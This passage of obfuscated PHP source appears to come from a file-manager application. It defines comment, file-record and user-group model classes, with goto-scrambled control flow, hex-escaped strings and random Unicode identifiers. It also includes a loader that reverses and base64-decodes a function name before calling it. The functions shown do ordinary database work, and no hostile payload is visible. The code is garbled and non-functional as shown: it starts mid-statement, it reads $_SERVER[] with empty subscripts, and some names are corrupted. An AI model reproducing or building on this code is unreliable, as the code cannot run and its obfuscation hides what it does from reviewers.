think_cache($f, $cǼ[33], $Aǋ); if (!1 !== $F񯡠) { return $F񯡠; } } $d⚛ = $this->query($Bܴ, $this->parseBind(!empty($a޵[$cǼ[281]]) ? $a޵[$cǼ[281]] : array())); goto cܿۏ; fӇ͸: } public function buildSelectSql($c󋳜 = array()) { goto f; e辂: return $B; goto eȾ; f: $bֲϪ =& $_SERVER[]; if (isset($c󋳜[$bֲϪ[349]])) { if (strpos($c󋳜[$bֲϪ[349]], $bֲϪ[47])) { list($EƎ, $F܌) = explode($bֲϪ[47], $c󋳜[$bֲϪ[349]]); } else { $EƎ = $c󋳜[$bֲϪ[349]]; } $EƎ = $EƎ ? $EƎ : 1; $F܌ = isset($F܌) ? $F܌ : (is_numeric($c󋳜[$bֲϪ[288]]) ? $c󋳜[$bֲϪ[288]] : 20); $eǉ = $F܌ * ((int) $EƎ - 1); $c󋳜[$bֲϪ[288]] = $eǉ . $bֲϪ[47] . $F܌; } if (think_config($bֲϪ[1001])) { $c͍ = $bֲϪ[1002] . md5(serialize($c󋳜)); $eɑ = think_cache($c͍); if ($eɑ) { return $eɑ; } } goto Cҏ; Cҏ: $B = $this->parseSql($this->selectSql, $c󋳜); $B .= $this->parseLock(isset($c󋳜[$bֲϪ[820]]) ? $c󋳜[$bֲϪ[820]] : !1); if (isset($c͍)) { think_cache($c͍, $B); } goto e辂; eȾ: } public function parseSql($A, $a = array()) { $cθ =& $_SERVER[]; $A = str_replace(array($cθ[1003], $cθ[1004], $cθ[1005], $cθ[1006], $cθ[1007], $cθ[1008], $cθ[1009], $cθ[1010], $cθ[1011], $cθ[1012], $cθ[1013]), array($this->parseTable("{$a[$cθ[275]]}"), $this->parseDistinct(isset($a[$cθ[1014]]) ? $a[$cθ[1014]] : !1), $this->parseField(!empty($a[$cθ[269]]) ? $a[$cθ[269]] : $cθ[182]), $this->parseJoin(!empty($a[$cθ[278]]) ? $a[$cθ[278]] : $cθ[33]), $this->parseWhere(!empty($a[$cθ[271]]) ? $a[$cθ[271]] : $cθ[33]), $this->parseGroup(!empty($a[$cθ[1015]]) ? $a[$cθ[1015]] : $cθ[33]), $this->parseHaving(!empty($a[$cθ[1016]]) ? $a[$cθ[1016]] : $cθ[33]), $this->parseOrder(!empty($a[$cθ[361]]) ? $a[$cθ[361]] : $cθ[33]), $this->parseLimit(!empty($a[$cθ[288]]) ? $a[$cθ[288]] : $cθ[33]), $this->parseUnion(!empty($a[$cθ[343]]) ? $a[$cθ[343]] : $cθ[33]), $this->parseComment(!empty($a[$cθ[350]]) ? $a[$cθ[350]] : $cθ[33])), $A); return $A; } public function getLastSql($d鑞 = '') { return $d鑞 ? $this->modelSql[$d鑞] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($F) { return addslashes($F); } public function setModel($D) { $this->model = $D; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto dп; Bӊ: $fꊰ = strrev(base64_decode($_SERVER[][0])); function binCheckNeq($FÜ, $E拱) { return $FÜ != $E拱; } $_SERVER[$_SERVER[][1]] = $fꊰ($_SERVER[$_SERVER[][2]]); goto F̦; D: class CommentModel extends ModelBase { protected $tableName = "\143\157\155\x6d\145\156\164"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\155\145" => "\143\157\x6d\x6d\145\x6e\x74\137\x6d\x65\x74\x61", "\155\x65\x74\x61\106\x69\145\x6c\144" => "\x63\x6f\155\155\x65\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Dܑ) { $Dͼ =& $_SERVER[]; if ($Dܑ[$Dͼ[1714]]) { $A = $this->where(array($Dͼ[1715] => $Dܑ[$Dͼ[1714]]))->find(); if (!$A || $A[$Dͼ[398]] != $Dܑ[$Dͼ[398]] || $A[$Dͼ[478]] != $Dܑ[$Dͼ[478]]) { return !1; } $this->where(array($Dͼ[1715] => $Dܑ[$Dͼ[1714]]))->setAdd($Dͼ[1716], 1); } $Dܑ[$Dͼ[1717]] = 0; $Dܑ[$Dͼ[1716]] = 0; $Dܑ[$Dͼ[725]] = 1; return $this->add($Dܑ); } public function commentCount($bƲ, $B÷Ɇ) { goto Dٺ˅; Bބ: $FĘ = array($D[478], $D[1718] => $D[474]); $AԆ = array($D[478] => array($D[7], $bƲ), $D[398] => $B÷Ɇ); $Fʍ = $this->field($FĘ)->where($AԆ)->group($D[478])->select(); goto a˪; a˪: return array_to_keyvalue($Fʍ, $D[478], $D[474]); goto FٲƮ; Dٺ˅: $D =& $_SERVER[]; if (!$bƲ) { return array(); } if (is_string($bƲ) || is_int($bƲ)) { $bƲ = array($bƲ); } goto Bބ; FٲƮ: } public function remove($Bꐾق) { $d㟹 =& $_SERVER[]; $Dݰ = array($d㟹[1715] => $Bꐾق); $eƱ = $this->where($Dݰ)->find(); if ($eƱ[$d㟹[1714]]) { $this->where(array($d㟹[1715] => $eƱ[$d㟹[1714]]))->setAdd($d㟹[1716], -1); } return $this->where($Dݰ)->delete(); } public function edit($Cɇ, $dጧ) { $eԡ =& $_SERVER[]; $D盳ݑ = array($eԡ[1715] => $Cɇ); return $this->where($D盳ݑ)->save(array($eԡ[1719] => $dጧ)); } public function prasise($b) { $DƬ =& $_SERVER[]; $Aӣ = Model($DƬ[1720]); $C = array($DƬ[1715] => $b, $DƬ[1515] => USER_ID); $cٓ˄ = $Aӣ->where($C)->find(); if (!$cٓ˄) { $Aӣ->add($C); $eԩō = $this->where(array($DƬ[1715] => $b))->setAdd($DƬ[1717], 1); } else { $Aӣ->where($C)->delete(); $eԩō = $this->where(array($DƬ[1715] => $b))->setAdd($DƬ[1717], -1); } return $eԩō; } public function targetInfo($D, $aҎΣ) { goto BߢӐ; Bۿ: return $b՟; goto a¿; BߢӐ: $aȴק =& $_SERVER[]; $a = array($aȴק[544] => $D, $aȴק[545] => $aҎΣ); $fŤ = $this->where($a)->count(); goto c; c: $eĦ = "\x52\111\107\x48\124\x20\112\x4f\x49\116\x20{$this->tablePrefix}\143\x6f\155\x6d\145\156\164\x5f\160\x72\x61\x69\x73\145\40\163\x74\141\x72\40\157\x6e\x20\143\157\x6d\155\145\156\x74\x2e\143\x6f\x6d\x6d\x65\156\x74\x49\x44\x20\x3d\40\163\164\x61\x72\56\x63\x6f\x6d\x6d\145\156\164\x49\104"; $Dք = $this->alias($aȴק[350])->where($a)->join($eĦ, $aȴק[1721])->count(); $b՟ = array($aȴק[1722] => $fŤ, $aȴק[1723] => $Dք); goto Bۿ; a¿: } public function listData($B) { $a =& $_SERVER[]; if (isset($B[$a[1724]])) { if ($B[$a[1724]]) { $B[$a[1725]] = array($a[971], intval($B[$a[1724]])); } unset($B[$a[1724]]); } if (isset($B[$a[1726]])) { if ($B[$a[1726]]) { $B[$a[1725]] = array($a[968], intval($B[$a[1726]])); } unset($B[$a[1726]]); } return $this->_listData($B); } private function _listData($b犷) { $E =& $_SERVER[]; $d = $this->where($b犷)->_makeOrder()->selectPage(100); $this->_listAppendParent($d[$E[365]]); $this->_listAppendUser($d[$E[365]]); $this->_listAppendMeta($d[$E[365]]); return $d; } private function _makeOrder() { $dץ =& $_SERVER[]; $f = array($dץ[1717], $dץ[1716], $dץ[192]); $d = Input::get($dץ[429], $dץ[7], $dץ[410], $f); $dӈ = Input::get($dץ[430], $dץ[7], $dץ[1517], array($dץ[1727], $dץ[425])); $a = $d . $dץ[50] . $dӈ; return $this->order($a); } private function _listAppendParent(&$B䣊) { goto FВ; bԳ̎: foreach ($B䣊 as &$b禜) { if (isset($B[$b禜[$E[1714]]])) { $b禜[$E[1728]] = $B[$b禜[$E[1714]]]; } } unset($b禜); goto d܊; FВ: $E =& $_SERVER[]; $e֏ = array_unique(array_to_keyvalue($B䣊, $E[33], $E[1714])); $e֏ = array_remove_value($e֏, $E[491]); goto Fğ; Fğ: if (!$e֏) { return; } $B = $this->where(array($E[1715] => array($E[7], $e֏)))->select(); $B = array_to_keyvalue($B, $E[1725]); goto bԳ̎; d܊: } private function _listAppendUser(&$bߢ) { goto aŮ; E뱡: if (count($E̜) == 0) { return; } foreach ($bߢ as $DԜ) { if (isset($DԜ[$DꇔЩ[1728]])) { $E̜[] = $DԜ[$DꇔЩ[1728]][$DꇔЩ[1523]]; } } $BغƲ = Model($DꇔЩ[501])->userListInfo($E̜); goto Eٍ; Eٍ: foreach ($bߢ as &$DԜ) { $DԜ[$DꇔЩ[557]] = $BغƲ[$DԜ[$DꇔЩ[1523]]]; if (isset($DԜ[$DꇔЩ[1728]])) { $DԜ[$DꇔЩ[1728]][$DꇔЩ[557]] = $BغƲ[$DԜ[$DꇔЩ[1728]][$DꇔЩ[1523]]]; } } unset($DԜ); goto Eأ; aŮ: $DꇔЩ =& $_SERVER[]; $E̜ = array_unique(array_to_keyvalue($bߢ, $DꇔЩ[33], $DꇔЩ[1523])); $E̜ = array_remove_value($E̜, $DꇔЩ[491]); goto E뱡; Eأ: } private function _listAppendMeta(&$a턠) { goto F; Eб: if (!$f) { return !1; } foreach ($a턠 as &$e瑵) { $e瑵[$dǠ[439]] = $f[$e瑵[$dǠ[1725]]]; if (isset($e瑵[$dǠ[1728]])) { $e瑵[$dǠ[1728]][$dǠ[439]] = $f[$e瑵[$dǠ[1728]][$dǠ[1725]]]; } } unset($e瑵); goto C΍; EÊȷ: if (!$dχ) { return; } foreach ($a턠 as $e瑵) { if (isset($e瑵[$dǠ[1728]])) { $dχ[] = $e瑵[$dǠ[1728]][$dǠ[1725]]; } } $f = $this->metaList($dχ); goto Eб; F: $dǠ =& $_SERVER[]; $dχ = array_unique(array_to_keyvalue($a턠, $dǠ[33], $dǠ[1725])); $dχ = array_remove_value($dχ, $dǠ[491]); goto EÊȷ; C΍: } private function metaList($F䎹Ϟ) { goto A; A: $A냐ی =& $_SERVER[]; if (!$F䎹Ϟ) { return array(); } $b = array($A냐ی[1725] => array($A냐ی[7], $F䎹Ϟ)); goto Bヘ帪; Ē: return $BƐ ? $BƐ : array(); goto A񭼢; Bヘ帪: $BƐ = Model($A냐ی[1729])->where($b)->select(); $BƐ = array_to_keyvalue_group($BƐ, $A냐ی[1725]); foreach ($BƐ as $Cȧ邺 => $bΚ򸗃) { $b֏ = array(); foreach ($bΚ򸗃 as $AՖ) { $b֏[$AՖ[$A냐ی[92]]] = $AՖ[$A냐ی[370]]; } $BƐ[$Cȧ邺] = $b֏; } goto Ē; A񭼢: } } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\146\x69\154\x65"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\x61\x6d\145" => "\151\x6f\x5f\146\151\x6c\145\x5f\155\x65\164\x61", "\155\145\164\x61\x46\151\x65\x6c\x64" => "\146\x69\154\145\x49\x44"); public function fileInfo($E֧ᙌ) { $a =& $_SERVER[]; static $c = array(); if (!isset($c[$E֧ᙌ])) { $Dտɶ = $a[1730]; $Aۑ = Model($a[444])->field($Dտɶ)->where(array($a[442] => $E֧ᙌ))->find(); $c[$E֧ᙌ] = $Aۑ; } return $c[$E֧ᙌ]; } public function addFileByContent($c׊ = '', $D۟ = '') { goto C; Eޓ: $Eӥ̪ = $AՆҋ . $b[1732] . rand_string(16); file_put_contents($Eӥ̪, $c׊); $EƝ = $this->addFile($Eӥ̪, $D۟, !0); goto F׷ú; F׷ú: if (file_exists($Eӥ̪)) { @unlink($Eӥ̪); } return $EƝ; goto D; C: $b =& $_SERVER[]; $AՆҋ = TEMP_PATH . $b[1731]; if (!is_dir($AՆҋ)) { mk_dir($AՆҋ); } goto Eޓ; D: } public function createFileName($d, $C׸ = false) { goto b; dצ: $D鑈 = $C羝ʤ->pathFather($e); static $BËÊ = false; $dڈ = $E[1733] . md5($D鑈); goto E; E: if (!$BËÊ && !Cache::get($dڈ)) { $BËÊ = !0; $cĈ = IO::mkdir($D鑈); if (!IO::exist($cĈ . $E[1734])) { IO::mkfile($cĈ . $E[1734]); } Cache::set($dڈ, 1, 3600 * 2); } return $e; goto b洝; b: $E =& $_SERVER[]; $C羝ʤ = IO::init($E[8]); $e = $this->makeFilePath($d, $C羝ʤ, $C׸); goto dצ; b洝: } public function makeFilePath($DӬ, $e, $f = false) { goto C; c۰: if (!$DӬ) { $Dц = $eܷ[1737]; } switch ($Dц) { case $eܷ[1738]: $a = $a . $eܷ[94] . $e->ext($DӬ); if ($Dӆ == $eܷ[1676]) { $a .= $eܷ[1424]; } break; case $eܷ[1739]: goto f鱊; Cˏ: $fϳ뎙 = $eܷ[1121] . $bҏ˧[$eܷ[388]] . $eܷ[396] . date($eܷ[1741]) . $e . $eܷ[8]; if ($Dӆ == $eܷ[1676]) { $DӬ .= $eܷ[1424]; } $c쇓Ա = $eܷ[1742] . $fϳ뎙 . $DӬ; goto F; bĭ: if (IO::isTypeObject($a) && !IO::isUploadServer($a)) { $Fڹα = IO::setContent($a, $eܷ[33]); if (!$Fڹα) { show_json($eܷ[1743], !1); } } CacheLock::unlock($c쇓Ա); break; goto C; f鱊: $Bƽß = Model($eܷ[1123])->get($eܷ[1420]); $e = substr(md5($eܷ[1740] . $Bƽß . date($eܷ[723])), 0, 8); $bҏ˧ = KodIO::defaultDriver(); goto Cˏ; F: CacheLock::lock($c쇓Ա); $a = $fϳ뎙 . $DӬ; if (IO::exist($fϳ뎙 . $DӬ)) { $c٨ = substr($DӬ, 0, strlen($DӬ) - strlen($Dӆ)); $a = $fϳ뎙 . $c٨ . substr($f, 0, 5) . $eܷ[94] . $Dӆ; } goto bĭ; C: case $eܷ[1737]: break; default: break; } return $a; goto FךЋ; C: $eܷ =& $_SERVER[]; $Dц = Model($eܷ[1123])->get($eܷ[1735]); $fϳ뎙 = KodIO::defaultIO() . date($eܷ[1736]); goto F㯘ڦ; F㯘ڦ: $a = $fϳ뎙 . rand_string(5) . short_id(100); $DӬ = str_replace($eܷ[8], $eܷ[70], KodIO::clear($DӬ)); $Dӆ = $e->ext($DӬ); goto c۰; FךЋ: } public function addFileByRemote($Dچ谌, $B޷매, $A = array()) { goto dི; A: $fȣ = IO::hashMd5($Dچ谌, $eʫ矍); $e = KodIO::defaultDriver(); $Eʞ = array($cፚ[543] => IO::size($Dچ谌), $cፚ[1744] => 1, $cፚ[407] => $B޷매, $cፚ[775] => $e[$cፚ[388]], $cፚ[408] => $Dچ谌, $cፚ[1745] => $A[$cፚ[170]] ? $A[$cፚ[170]] : IO::hashSimple($Dچ谌), $cፚ[1746] => $fȣ ? $fȣ : $eʫ矍); goto cɼ̂; dི: $cፚ =& $_SERVER[]; if (!IO::exist($Dچ谌)) { return !1; } $eʫ矍 = $A[$cፚ[169]] ? $A[$cፚ[169]] : $cፚ[33]; goto A; cɼ̂: if ($B胑 = $this->addFileCheckExist($Eʞ[$cፚ[170]], $Eʞ[$cፚ[169]], $Eʞ[$cፚ[77]])) { return $B胑; } return $this->addFileData($Eʞ); goto E; E: } private function addFileData($c) { $BѠ =& $_SERVER[]; if (!$c) { return !1; } $c[$BѠ[77]] = intval($c[$BѠ[77]]); if (!$c[$BѠ[77]] && strlen($c[$BѠ[170]]) > 32) { $c[$BѠ[77]] = intval(substr($c[$BѠ[170]], 32)); } $dٞ = $this->add($c); return $this->find($dٞ); } public function addFile($Fշ, $d, $e̋ = false) { goto dӎ؆; dӎ؆: $Dӏ = IO::hashSimple($Fշ); $dΞ = IO::hashMd5($Fշ); $fޡ¨ = IO::size($Fշ); goto E踴; E踴: $EΚ = $_SERVER[][1747] . $dΞ; CacheLock::lock($EΚ); if ($AČƱ = $this->addFileCheckExist($Dӏ, $dΞ, $fޡ¨)) { CacheLock::unlock($EΚ); return $AČƱ; } goto cޗ֥; f: return $aՐ; goto bɚܲ; cޗ֥: $fԆ = $this->addFileMake($Fշ, $fޡ¨, $Dӏ, $dΞ, $d, $e̋); $aՐ = $this->addFileData($fԆ); CacheLock::unlock($EΚ); goto f; bɚܲ: } public function addFileMake($AϘ, $Fɢ߱, $fϒ, $cۘʛ, $aڇ, $fȄ۝) { goto A퉇; A퉇: $A =& $_SERVER[]; $aЂ = $this->createFileName($aڇ, $cۘʛ); $f = get_path_father($aЂ); goto bՂ; C: $f = KodIO::defaultDriver(); $aٽ = array($A[543] => $Fɢ߱, $A[1744] => 1, $A[407] => $aڇ, $A[775] => $f[$A[388]], $A[408] => $aЂ, $A[1745] => $fϒ, $A[1746] => $cۘʛ); return $aٽ; goto Cܳ; bՂ: $AƦ = get_path_this($aЂ); if ($fȄ۝) { $A = IO::move($AϘ, $f, !1, $AƦ); } else { $A = IO::copy($AϘ, $f, !1, $AƦ); } if (!$A) { return !1; } goto C; Cܳ: } public function addFileCheckExist($eڠ, $Dҏ, $aܧ̑) { $B =& $_SERVER[]; $dնо = $this->findByHash($eڠ, $Dҏ); if (!$dնо) { return !1; } $E = array($B[1744] => intval($dնо[$B[1748]]) + 1, $B[543] => $aܧ̑); $this->where(array($B[442] => $dնо[$B[441]]))->save($E); return $dնо; } public function remove($Bܸ) { $this->linkCountChange($Bܸ, !1); $this->clearEmpty(); return !0; } public function linkAdd($fϒ) { $this->linkCountChange($fϒ, !0); } public function linkCountChange($bǨ, $aٵ) { goto C藣; C藣: $Bĉ =& $_SERVER[]; if (!$bǨ) { return; } if (!is_array($bǨ)) { $bǨ = array($bǨ); } goto a; bĊ: foreach ($F as $b͂۬ => $Dņ) { $Bںꉷ = $Dņ . $Bĉ[33]; if (!$eᖲ׏[$Bںꉷ]) { $eᖲ׏[$Bںꉷ] = array(); } $eᖲ׏[$Bںꉷ][] = $b͂۬; } foreach ($eᖲ׏ as $Dņ => $b⏎) { if (!$b⏎) { continue; } $Dņ = $aٵ ? $Dņ : -intval($Dņ); $a = array($Bĉ[441] => array($Bĉ[7], $b⏎)); if ($Dņ < 0) { $a[$Bĉ[1748]] = array($Bĉ[972], abs($Dņ)); } $this->where($a)->setAdd($Bĉ[1748], $Dņ); } goto c; a: $F = array(); foreach ($bǨ as $b͂۬) { $Bںꉷ = $b͂۬ . $Bĉ[33]; if (!$F[$Bںꉷ]) { $F[$Bںꉷ] = 0; } $F[$Bںꉷ]++; } $eᖲ׏ = array(); goto bĊ; c: } public function findByHash($F, $f = false) { $bՐ =& $_SERVER[]; if (!$F && !$f) { return !1; } $C䊃Ҟ = array($bՐ[1745] => $F); if ($f) { $C䊃Ҟ = array($bՐ[1746] => $f); } return $this->order($bՐ[1749])->where($C䊃Ҟ)->find(); } public function clearEmpty($cխ = 0) { goto e; bƛו: foreach ($eǯ as $C⺡) { $b̚->update(1); $this->resetFile($C⺡); } $b̚->end(); goto dߡ; e: $eĢܐ =& $_SERVER[]; $E膳 = time() - 3600 * 24 * $cխ; $dע = $eĢܐ[1750] . $E膳; goto cב; cב: $eǯ = $this->where($dע)->select(); if (!$eǯ) { return; } $b̚ = new Task($eĢܐ[1751], $eĢܐ[33], count($eǯ)); goto bƛו; dߡ: } public function resetFile($E􄤈) { goto Aӊ; D: if ($E􄤈[$A׈[1748]] != $E˰ʃ) { $this->where($c)->save(array($A׈[1744] => $E˰ʃ)); } goto A; Aӊ: $A׈ =& $_SERVER[]; $c = array($A׈[442] => $E􄤈[$A׈[441]]); $CИ = Model($A׈[1203])->where($c)->count(); goto a; a: $aݤ = Model($A׈[1752])->where($c)->count(); $E˰ʃ = intval($CИ) + intval($aݤ); if ($E˰ʃ == 0) { IO::remove($E􄤈[$A׈[75]]); $this->where($c)->delete(); $this->metaSet($E􄤈[$A׈[441]], null, null); return; } goto D; A: } public function storageInfo($eߩ = false) { goto e㶋; e֍: for ($b = 0; $b < $aҜ임; $b = $b + $D) { $fٛ = $this->limit($b, $b + $D)->select(); foreach ($fٛ as $cς) { $C += $cς[$DЏ[77]] * $cς[$DЏ[1748]]; $Aؾː += $cς[$DЏ[77]] * ($cς[$DЏ[1748]] - 1); $A += $cς[$DЏ[1748]]; } } $Bʉ = array($DЏ[1753] => $C, $DЏ[1754] => $Aؾː, $DЏ[1755] => $Aؾː / $C, $DЏ[81] => $aҜ임, $DЏ[1756] => $A); return $Bʉ; goto eî; e㶋: $DЏ =& $_SERVER[]; $aҜ임 = $this->count() + 0.0; $Aؾː = 0; goto a⊏; a⊏: $C = 1; $A = 0; $D = 5000; goto e֍; eî: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\x70"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\141\x6d\145" => "\147\162\x6f\165\x70\137\x6d\x65\164\x61", "\155\x65\164\x61\106\151\x65\x6c\144" => "\147\x72\157\x75\x70\x49\104"); protected function cacheFunctionAlias($Fڏ) { $d =& $_SERVER[]; return array($d[1757] => array($Fڏ[0], $d[1758]), $d[1759] => array($Fڏ[0], $d[1758])); } protected function getInfo($b՛ڐ) { $E = $this->getInfoSimple($b՛ڐ); if (!$E) { return !1; } return $this->_listDataApplyItem($E); } protected function getInfoSimple($e⍍, $Aύ = false) { $e =& $_SERVER[]; if ($Aύ) { $BϬ = array($e[1686] => intval($e⍍)); $D = $this->where($BϬ)->find(); return is_array($D) ? $D : array(); } return $this->cacheFunctionGet($e[1760], $e⍍); } protected function groupAdd($eƺ) { goto eԴ; Eєخ: if (!empty($eƺ[$D[1686]])) { $BѠ[$D[1686]] = $eƺ[$D[1686]]; } $fƿҏш = $this->add($BѠ); $this->setNamePinyin($fƿҏш, $BѠ[$D[28]]); goto D; D: if (isset($eƺ[$D[1763]])) { $this->metaSet($fƿҏш, array($D[1763] => $eƺ[$D[1763]], $D[1764] => $eƺ[$D[1764]])); unset($eƺ[$D[1763]]); unset($eƺ[$D[1764]]); } Model($D[1203])->groupRootAdd($fƿҏш); return $fƿҏш; goto b; eԴ: $D =& $_SERVER[]; if (!$eƺ[$D[472]] && isset($eƺ[$D[1686]]) && $eƺ[$D[1686]] == 1) { if ($c͊͊ = $this->getInfoSimple($eƺ[$D[1686]], !0)) { return $eƺ[$D[1686]]; } } else { $c͊͊ = $this->getInfoSimple($eƺ[$D[472]]); if (!$c͊͊) { return !1; } } $c = $D[493]; goto c; c: if ($c͊͊[$D[481]]) { $c = $c͊͊[$D[481]] . $c͊͊[$D[1686]] . $D[47]; } $BѠ = array($D[407] => $this->groupNameAuto($eƺ[$D[472]], $eƺ[$D[28]]), $D[389] => $eƺ[$D[472]], $D[548] => $c, $D[1761] => $eƺ[$D[1670]], $D[1762] => 0, $D[1690] => 0); if (isset($eƺ[$D[1709]])) { $BѠ[$D[1709]] = $eƺ[$D[1709]]; } else { $fÏ = $this->max($D[1709]); if (!$fÏ) { $fÏ = 0; } $BѠ[$D[1709]] = $fÏ + 1; } goto Eєخ; b: } protected function groupEdit($f, $f) { goto B亙; eׂ: if (!empty($f[$a黸Ą[472]])) { $c = $this->getInfoSimple($f[$a黸Ą[472]]); if (!$c) { return !1; } if ($AƐ[$a黸Ą[1686]] == $c[$a黸Ą[1686]]) { return !1; } if ($f[$a黸Ą[472]] != $AƐ[$a黸Ą[472]]) { if ($c[$a黸Ą[481]] !== $AƐ[$a黸Ą[481]] && strpos($c[$a黸Ą[481]], $AƐ[$a黸Ą[481]] . $AƐ[$a黸Ą[1686]] . $a黸Ą[47]) === 0) { return !1; } $f[$a黸Ą[548]] = $c[$a黸Ą[481]] . $f[$a黸Ą[472]] . $a黸Ą[47]; $this->_changeChildLevel($AƐ, $c); } } if (isset($f[$a黸Ą[28]])) { $this->setNamePinyin($f, $f[$a黸Ą[28]]); } if (isset($f[$a黸Ą[1763]])) { $this->metaSet($f, array($a黸Ą[1763] => $f[$a黸Ą[1763]], $a黸Ą[1764] => $f[$a黸Ą[1764]])); unset($f[$a黸Ą[1763]]); unset($f[$a黸Ą[1764]]); } goto bྰͲ; B亙: $a黸Ą =& $_SERVER[]; $AƐ = $this->getInfoSimple($f); if (!$AƐ) { return !1; } goto eׂ; bྰͲ: if (isset($f[$a黸Ą[28]]) && $f[$a黸Ą[28]] != $AƐ[$a黸Ą[28]]) { $this->_clearChildrenCache($AƐ); } return $this->where(array($a黸Ą[1765] => $f))->save($f); goto Bఒ; Bఒ: } private function _clearChildrenCache($aݪ) { $fѕ =& $_SERVER[]; $cɊ = array($fѕ[548] => array($fѕ[507], $aݪ[$fѕ[481]] . $aݪ[$fѕ[1686]] . $fѕ[508])); $CӇљ = $this->field($fѕ[1686])->where($cɊ)->select(); foreach ($CӇљ as $Dǣۯ) { $this->cacheFunctionClear($fѕ[1766], $Dǣۯ[$fѕ[1686]]); $this->cacheFunctionClear($fѕ[1760], $Dǣۯ[$fѕ[1686]]); } } private function _changeChildLevel($aЕ, $D¬Ê, $aÆ = false) { goto E; cǑ⭍: if ($aÆ) { $c = $D¬Ê[$F͉[481]] . $D¬Ê[$F͉[1686]] . $F͉[47]; } $eۅƥ = array($F͉[548] => array($F͉[507], $aЕ[$F͉[481]] . $aЕ[$F͉[1686]] . $F͉[508])); $f֐ = array($F͉[548] => array($F͉[556], "\x72\145\160\154\x61\143\145\x28\x70\141\162\145\x6e\164\114\145\x76\x65\x6c\54\47{$Dܧ}\x27\x2c\47{$c}\x27\x29")); goto C覽; E: $F͉ =& $_SERVER[]; $Dܧ = $aЕ[$F͉[481]] . $aЕ[$F͉[1686]] . $F͉[47]; $c = $D¬Ê[$F͉[481]] . $D¬Ê[$F͉[1686]] . $F͉[47] . $aЕ[$F͉[1686]] . $F͉[47]; goto cǑ⭍; C覽: $this->_clearChildrenCache($aЕ); $this->where($eۅƥ)->data($f֐)->save(); goto D＼; D＼: } public function setNamePinyin($Cٯ, $Fݞȉ = false) { $a❋ =& $_SERVER[]; if (!$Fݞȉ) { $fӐ = $this->getInfoSimple($Cٯ); $Fݞȉ = $fӐ[$a❋[28]]; } if (!Input::check($Fݞȉ, $a❋[551])) { $this->metaSet($Cٯ, $a❋[438], null); $this->metaSet($Cٯ, $a❋[437], null); return; } $bӗ = array($a❋[438] => str_replace($a❋[50], $a❋[33], Pinyin::encode($Fݞȉ)), $a❋[437] => Pinyin::encode($Fݞȉ, $a❋[552])); $this->metaSet($Cٯ, $bӗ); } protected function groupStatus($c, $dݒ׏) { goto fߋ׎; C: foreach ($F婯 as $c) { $a∵[] = array($D䓜[1686] => $c, $D䓜[92] => $D䓜[725], $D䓜[370] => $dݒ׏); } return Model($D䓜[1767])->addAll($a∵, array(), !0); goto FƿƮ; fʮ: if ($dݒ׏ == $D䓜[86]) { $F婯 = $this->parentLevelArray($fڊڠݲ[$D䓜[481]]); } else { $c = array($D䓜[548] => array($D䓜[507], $fڊڠݲ[$D䓜[481]] . $fڊڠݲ[$D䓜[1686]] . $D䓜[508])); $F婯 = $this->where($c)->field($D䓜[1686])->select(); $F婯 = array_to_keyvalue($F婯, $D䓜[33], $D䓜[1686]); } $F婯[] = $fڊڠݲ[$D䓜[1686]]; $a∵ = array(); goto C; fߋ׎: $D䓜 =& $_SERVER[]; $fڊڠݲ = $this->getInfoSimple($c); if (!$fڊڠݲ) { return !1; } goto fʮ; FƿƮ: } protected function groupRemove($Dҥ) { goto aݏ; Bμ: $this->where(array($B[472] => $Dҥ))->save(array($B[472] => $f݇[$B[472]])); Model($B[1767])->where($fǏʯ)->delete(); Model($B[1768])->where($fǏʯ)->delete(); goto Cɠэ; Cɠэ: Model($B[790])->groupRootRemove($Dҥ); return $this->where($fǏʯ)->delete(); goto C; F͇: if (!$f݇ || $f݇[$B[472]] == 0) { return !1; } $f = $this->getInfoSimple($f݇[$B[472]]); $this->_changeChildLevel($f݇, $f, !0); goto Bμ; aݏ: $B =& $_SERVER[]; $fǏʯ = array($B[1686] => $Dҥ); $f݇ = $this->where($fǏʯ)->find(); goto F͇; C: } protected function groupSort($d豠) { $b˿ =& $_SERVER[]; $aջ = array(); foreach ($d豠 as $f => $aݟ) { $aջ[] = array($b˿[1686], $aݟ, $b˿[1709], $f + 1); } $this->saveAll($aջ); } public function listData() { $a҃ȍ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($a҃ȍ[$_SERVER[][365]]); return $a҃ȍ; } private function _makeOrder($eاї = '') { goto aӃ; c: $d缆 = Input::get($Dڡ[429], $Dڡ[7], $Dڡ[1690], $D); $b = Input::get($Dڡ[430], $Dڡ[7], $Dڡ[1769], array($Dڡ[1769], $Dڡ[424])); $b = $F[$b]; goto cܞ; aӃ: $Dڡ =& $_SERVER[]; $D = array($Dڡ[1686], $Dڡ[28], $Dڡ[1672], $Dڡ[192]); $F = array($Dڡ[422] => $Dڡ[423], $Dڡ[424] => $Dڡ[425]); goto c; cܞ: $eاї = $eاї . "{$d缆}\40{$b}\x2c\40\x67\162\157\165\x70\x49\104\40\x61\163\143"; return $this->order($eاї); goto eɯ; eɯ: } public function listChild($fԤ) { $aɰ =& $_SERVER[]; $dइ = $this->where(array($aɰ[472] => $fԤ))->_makeOrder()->selectPage(200); $this->_listDataApply($dइ[$aɰ[365]]); return $dइ; } public function listByID($aې) { $D =& $_SERVER[]; if (!$aې) { return array(); } $D˾ = array($D[1686] => array($D[7], $aې)); $eܨ = $this->where($D˾)->select(); $this->_listDataApply($eܨ); return $eܨ; } public function listSearch($eǄ) { goto e߾޶; e߾޶: $cƝĳ =& $_SERVER[]; $E = $eǄ[$cƝĳ[1770]]; $E儎 = isset($eǄ[$cƝĳ[1771]]) ? $eǄ[$cƝĳ[1771]] : !1; goto b؅; b؅: if (!trim($E)) { return !1; } $E = str_replace($cƝĳ[1772], $cƝĳ[1773], $E); $D = array($cƝĳ[1686] => array($cƝĳ[378], "{$E}\x25"), $cƝĳ[28] => array($cƝĳ[378], 